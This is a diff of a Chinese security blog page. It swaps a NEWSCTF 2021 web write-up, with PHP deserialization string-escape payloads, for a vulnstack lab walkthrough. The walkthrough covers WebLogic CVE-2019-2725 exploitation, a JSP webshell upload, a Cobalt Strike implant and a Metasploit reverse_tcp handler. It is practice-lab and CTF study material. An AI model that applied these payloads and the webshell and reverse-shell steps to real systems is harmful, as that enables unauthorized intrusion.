@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">NEWSCTF_2021.6-Web复现 | Troy3e</title>
+  <title itemprop="name">vulnstack内网靶场(二) | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -185,15 +185,15 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-48496.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-48496.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-876112.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-876112.png">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      NEWSCTF_2021.6-Web复现</h1>
+      vulnstack内网靶场(二)</h1>
       <p class="entry-census">
         <span>
           <a href="">
-            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/215153415.png">
+            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg">
           </a>
         </span>
         <span>
@@ -201,7 +201,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-6-5<span class="bull">
+        2021-10-16<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -215,203 +215,58 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>虽然已经不打CTF了，但是还是要学习。比赛当天看了一遍题觉得还行，昨天wp出了来复现一下。<br>看了wp，题目难度中等，虽然都是见过的知识点，但是出的也很不错。</p>
-<p>一、easy_web<br>这个就不说了，简单题。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210605183050.png" alt></p>
-<pre><code>webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806
-</code></pre><p>二、weblog</p>
-<pre><code>&lt;?php
-highlight_file(__FILE__);
-error_reporting(0);
-class B{
-    public $logFile;
-    public $initMsg;
-    public $exitMsg;
-
-    function __construct($file){
-        // initialise variables
-        $this-&gt;initMsg=&quot;#--session started--#\n&quot;;
-        $this-&gt;exitMsg=&quot;#--session end--#\n&quot;;
-        $this-&gt;logFile =  $file;
-        readfile($this-&gt;logFile);
-
-    }
-
-    function log($msg){
-        $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
-        fwrite($fd,$msg.&quot;\n&quot;);
-        fclose($fd);
-    }
-
-    function __destruct(){
-        echo &quot;this is destruct&quot;;
-    }
-}
-
-class A {
-    public $file = &#39;flag{xxxxxxxx}&#39;;
-    public $weblogfile;
-
-    function __construct() {
-        echo $this-&gt;file;
-    }
-
-    function __wakeup(){
-        // self::waf($this-&gt;filepath);
-        $obj = new B($this-&gt;weblogfile);
-
-    }
-
-    public function waf($str){
-        $str=preg_replace(&quot;/[&lt;&gt;*#&#39;|?\n ]/&quot;,&quot;&quot;,$str);
-        $str=str_replace(&#39;flag&#39;,&#39;&#39;,$str);
-        return $str;
-    }
-
-    function __destruct(){
-        echo &quot;this is destruct&quot;;
-    }
-
-}
-class C {
-    public $file;
-    public $weblogfile;
-}
-class D{
-    public $logFile;
-    public $initMsg;
-    public $exitMsg;
-}
-
-function is_serialized($data){
-
-    $r = preg_match_all(&#39;/:\d*?:&quot;/&#39;,$data,$m,PREG_OFFSET_CAPTURE);
-    if(!empty($r)) {
-        foreach($m[0] as $v){
-            $a = intval($v[1])+strlen($v[0])+intval(substr($v[0],1));
-            if($data[$a] !== &#39;&quot;&#39;)
-                 return false;
-        }
-    }
-    if(!is_string($data))
-        return false;
-    $data = trim($data);
-    if(&#39;N;&#39; === $data)
-        return true;
-    if(!preg_match(&#39;/^([adObis]):/&#39;,$data,$badions))
-        return false;
-    switch($badions[1]){
-        case &#39;a&#39;:
-        case &#39;O&#39;:
-        case &#39;s&#39;:
-            if(preg_match( &quot;/^{$badions[1]}:[0-9]+:.*[;}]\$/s&quot;, $data ) )
-                return true;
-            break;
-        case &#39;b&#39;:
-        case &#39;i&#39;:
-        case &#39;d&#39;:
-            if(preg_match(&quot;/^{$badions[1]}:[0-9.E-]+;\$/&quot;, $data))
-                return true;
-            break;
-    }
-    return false;
-
-}
-$log = $_GET[&#39;log&#39;];
-if(!is_serialized($log)){
-    die(&#39;no1&#39;);
-}
-$log1 = preg_replace(&quot;/A/&quot;,&quot;C&quot;,$log);
-$log2 = preg_replace(&quot;/B/&quot;,&quot;D&quot;,$log1);
-if(!unserialize($log2)){
-    die(&#39;no2&#39;);
-}
-$log = preg_replace(&quot;/[&lt;&gt;*#&#39;|?\n ]/&quot;,&quot;&quot;,$log);
-$log = str_replace(&#39;flag&#39;,&#39;&#39;,$log);
-$log_unser = unserialize($log);
-?&gt;
-</code></pre><p>看着长，其实简单的很。<br>首先抛开waf不看。A类控制参数，B类readfile，而A类下wakeup下正好有个调用B类的obj。<br>所以直接</p>
-<pre><code>&lt;?php
-class A {
-    public $file;
-    public $weblogfile;
-}
-$a=new A();
-$a-&gt;weblogfile=&#39;flag.php&#39;;
-echo serialize($a);
-?&gt;
-</code></pre><p>即可，但是肯定不会这么简单的，关键在这里：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606004129.png" alt></p>
-<p>在前面用:&lt;8绕过了</p>
-<pre><code>$r = preg_match_all(&#39;/:\d*?:&quot;/&#39;,$data,$m,PREG_OFFSET_CAPTURE);
-</code></pre><p>之后，传到log2那里就变成了这样：</p>
-<pre><code>O:1:&quot;C&quot;:2:{s:4:&quot;file&quot;;s:14:&quot;flag{xxxxxxxx}&quot;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;fflaglag.php&quot;;}
-</code></pre><p>显然这是无法成功反序列化的，我们需要让字符逃逸，长度为25</p>
-<pre><code>&quot;;s:10:&quot;weblogfile&quot;;s:40:
-</code></pre><p>利用flag和一堆符号都能换空的特点：</p>
-<pre><code>&lt;?php
-class A {
-    public $file=&#39;flagflagflagflagflagflag&lt;&#39;;
-    public $weblogfile=&#39;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;flflagag.php&quot;;}&#39;;    
-}
-echo serialize (new A);
-</code></pre><p>这样传到log2那里就变成了：</p>
-<pre><code>O:1:&quot;C&quot;:2:{s:4:&quot;file&quot;;s:25:&quot;flagflagflagflagflagflag&lt;&quot;;s:10:&quot;weblogfile&quot;;s:40:&quot;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;flflagag.php&quot;;}&quot;;}
-</code></pre><p>变成了字符串的一部分，可以正常执行。<br>简单题。</p>
-<p>三、weblogin<br>看了提示好像又是个php反序列化字符串逃逸。。。<br>这个我懂，反序列化逃逸好出并且看起来比较难，我最近也出了一个字符串逃逸的，不过没这么复杂。</p>
-<p>源码很长，是一个处理用户的路由。这种很长的源码直接倒推，先找flag输出点：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606141052.png" alt></p>
-<p>看起来是要写个满足条件的文件才会输出flag。<br>全局搜索file_put，找到四个全是 file_put_contents($file,enc(serialize($p)));<br>来看一下这个enc：</p>
-<pre><code>function enc($str){
-    $_str = &#39;&#39;;
-    for($i=0;$i&lt;strlen($str);$i++){
-        if ($str[$i] !== &#39;=&#39;){
-            $_str = $_str.&#39;=&#39;.dechex(ord($str[$i]));
-        }else{
-            $_str = $_str.$str[$i].$str[$i+1].$str[$i+2];
-            $i = $i+2;
-        }
-    }
-    return $_str;
-} 
-</code></pre><p>试一下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606141828.png" alt></p>
-<p>转换成等号加16进制的ascii码。但是下面那个i+2很明显说明了不会处理已经编码过的，比如：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606141937.png" alt></p>
-<p>有啥用呢，这就得看下面反序列化里面的伪协议：</p>
-<pre><code>$p = unserialize(filter(file_get_contents(&#39;php://filter/read=convert.quoted-printable-decode/resource=&#39;.$file))); 
-</code></pre><p>简单点说就是把上面编码过的解码，比如=31变成1，字符减少了两个。<br>接下来看控制生成文件的地方：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606153149.png" alt></p>
-<p>datafile可控。</p>
-<pre><code>class Action {
-public $data=array();
-public $username=&#39;Troy3e&#39;;
-public $password=&#39;Troy3e&#39;;
-public $datafile=&#39;flag01476f0ab4de69015b1b6e07a0e84095&#39;;
-public $act=&#39;register&#39;;
-}
-echo serialize(new Action());
-//O:6:&quot;Action&quot;:5:{s:4:&quot;data&quot;;a:0:{}s:8:&quot;username&quot;;s:6:&quot;Troy3e&quot;;s:8:&quot;password&quot;;s:6:&quot;Troy3e&quot;;s:8:&quot;datafile&quot;;s:36:&quot;flag01476f0ab4de69015b1b6e07a0e84095&quot;;s:3:&quot;act&quot;;s:8:&quot;register&quot;;}
-</code></pre><p>但是在这里面action无法控制，然而我们可以控制username和password，还是那句话，永远不要相信用户的输入。</p>
-<pre><code>&lt;?php
-class Action {
-    public $data=array(&#39;Troy3e&#39;,&#39;Troy3e&#39;);
-    public $username=&#39;&#39;;
-    public $password=&#39;&#39;;
-    public $datafile=&#39;&#39;;
-    public $act=&#39;&#39;;
-    }
-    echo serialize(new Action());
-?&gt;
-//O:6:&quot;Action&quot;:5:{s:4:&quot;data&quot;;a:2:{i:0;s:6:&quot;Troy3e&quot;;i:1;s:6:&quot;Troy3e&quot;;}s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:0:&quot;&quot;;s:3:&quot;act&quot;;s:0:&quot;&quot;;}
-</code></pre><p>到这其实就很明显了username处控制长度逃逸出数组，password里面是我们控制的反序列化的内容。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606160638.png" alt></p>
-<p>十个。后面就不多说了，直接贴个官方payload：</p>
-<pre><code>username==50=50=50=50=50&amp;password=a&quot;;s:1:&quot;a&quot;;}s:8:&quot;username&quot;;s:9:&quot;lastsward&quot;;s:8:&quot;password&quot;;s:9:&quot;lastsward&quot;;s:8:&quot;datafile&quot;;s:36:&quot;flagf528764d624db129b32c21fbca0cb8d6&quot;;s:3:&quot;act&quot;;s:8:&quot;register&quot;;}
-</code></pre><p>四、impossible ip<br>后面那个ssrf打fpm已经做烂了就不讲了，看一下前面这个socket。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606162314.png" alt></p>
-<p>这个知识点我倒是没见过，学习了。</p>
-<p>总结：<br>闲着没事，就看四个。这几个还是比较简单的。<br>溜了，学习去了。</p>
+          <p>这次就不写保姆级教程了，太累了。<br>老实说这些靶场其实学不到什么技术，只是用来练习使用各种工具。<br>靶场链接：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>网络拓扑图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606213851.png" alt></p>
+<p>网卡</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606213827.png" alt></p>
+<p>kali：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606214434.png" alt></p>
+<p>WEB、PC：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606214514.png" alt></p>
+<p>DC：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606214537.png" alt></p>
+<p>若Web密码错误的，在快照管理器里面选择转到1.3即可。<br>手动开启Web服务，依次管理员执行账号为administrator，密码为1qaz@WSX。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606214625.png" alt></p>
+<p>打开web服务，需要管理员权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211015204358.png" alt></p>
+<p>ping一下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606214829.png" alt></p>
+<p>搭建完成。</p>
+<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><p>nmap收集一波信息，扫到了7001，实习的时候研究过weblogic，所以直接访问后台。</p>
+<p><a href="http://192.168.111.80:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://192.168.111.80:7001/console/login/LoginForm.jsp</a></p>
+<p>WebLogic 10.3.6.0，康康工作时候的记录：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211015210034.png" alt></p>
+<p>cve-2019-2725</p>
+<p>先连接冰蝎，说到这不得不吐槽一下java，冰蝎和burp的java环境要求不一样导致要换来换去。</p>
+<p>所以改用现成工具：<a href="https://kfi.re/220.html" target="_blank" rel="noopener">https://kfi.re/220.html</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016145917.png" alt></p>
+<p>weblogic上传木马路径选择：<a href="https://www.cnblogs.com/sstfy/p/10350915.html" target="_blank" rel="noopener">https://www.cnblogs.com/sstfy/p/10350915.html</a></p>
+<p>\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016151233.png" alt></p>
+<p>访问 <a href="http://192.168.111.80:7001/console/framework/skins/wlsconsole/images/shell.jsp" target="_blank" rel="noopener">http://192.168.111.80:7001/console/framework/skins/wlsconsole/images/shell.jsp</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016151656.png" alt></p>
+<h2 id="拿到CS的shell"><a href="#拿到CS的shell" class="headerlink" title="拿到CS的shell"></a>拿到CS的shell</h2><p>利用冰蝎上传cs马</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016161107.png" alt></p>
+<p>虽然开了360，但是似乎并没有拦到我。<br>看到网上很多文章都是被拦截和绕过的，懒得整了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016161325.png" alt></p>
+<p>用cs自带的提权直接成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016162544.png" alt></p>
+<p>接下来用cs给msf派生一个shell。</p>
+<h2 id="派生一个msf的shell（非必要）"><a href="#派生一个msf的shell（非必要）" class="headerlink" title="派生一个msf的shell（非必要）"></a>派生一个msf的shell（非必要）</h2><p>这一步不是必须的，毕竟cs更适合打windows，只是记录一下技巧。</p>
+<p>1、msf配置监听</p>
+<pre><code>msf &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set lhost 192.168.135.128
+msf exploit(handler) &gt; set lport 9999
+msf exploit(handler) &gt; exploit
+</code></pre><p>然后cs创建个新的监听器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016193448.png" alt></p>
+<p>右键想要派生的shell，点击spawn，选择刚刚创建的listener即可。但是我这里试了几次都没出的来，可能是环境问题。</p>
+<p>问题不大，反正这里知道怎么派生即可。</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016194629.png" alt></p>
+<p>看了看后面的操作和一差不多，就不搞了。有空看看。</p>
+<p><a href="https://www.i4k.xyz/article/weixin_45605352/119898843" target="_blank" rel="noopener">https://www.i4k.xyz/article/weixin_45605352/119898843</a></p>
 
         </div>
         <!-- .entry-content -->
@@ -440,36 +295,19 @@ class Action {
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/06/08/极致CMS漏洞整合与分析/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-304364.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-304364.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                极致CMS漏洞整合与分析</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/06/03/vulnstack红队实战-一/" rel="next">
+            <a href="/2021/10/11/nodejs随笔/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1145960.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1145960.png">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1181512.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1181512.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                vulnstack内网靶场(一)保姆级教程</h3>
+                nodejs随笔</h3>
                 <hr>
               </div>
             </a>
@@ -493,7 +331,7 @@ class Action {
 
       <section class="author-profile">
         <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/215153415.png" itemprop="image" alt="Troy3e" height="70" width="70"></a>
+          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
           <div class="meta">
             <span class="title">Author</span>
             <h3 itemprop="name">
